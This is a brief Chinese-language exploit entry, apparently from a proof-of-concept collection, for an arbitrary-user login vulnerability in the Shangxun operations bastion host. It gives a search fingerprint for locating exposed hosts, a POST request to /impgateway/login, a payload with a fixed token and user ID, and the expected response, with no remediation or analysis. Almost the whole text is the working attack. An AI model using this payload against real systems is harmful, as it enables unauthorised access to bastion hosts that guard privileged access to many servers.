# 上讯运维堡垒机login存在任意用户登录漏洞

上讯运维堡垒机 ｜ 其他 ｜ —
- **指纹**：`body="/default/switchlocale"`
- **请求**：`POST /impgateway/login HTTP/1.1`

**Payload**
```
token=lGLYkKyLa3nxCS9zibpO2g==&user=1
```
- **响应特征**：200 ACCESS_TOKEN_ERROR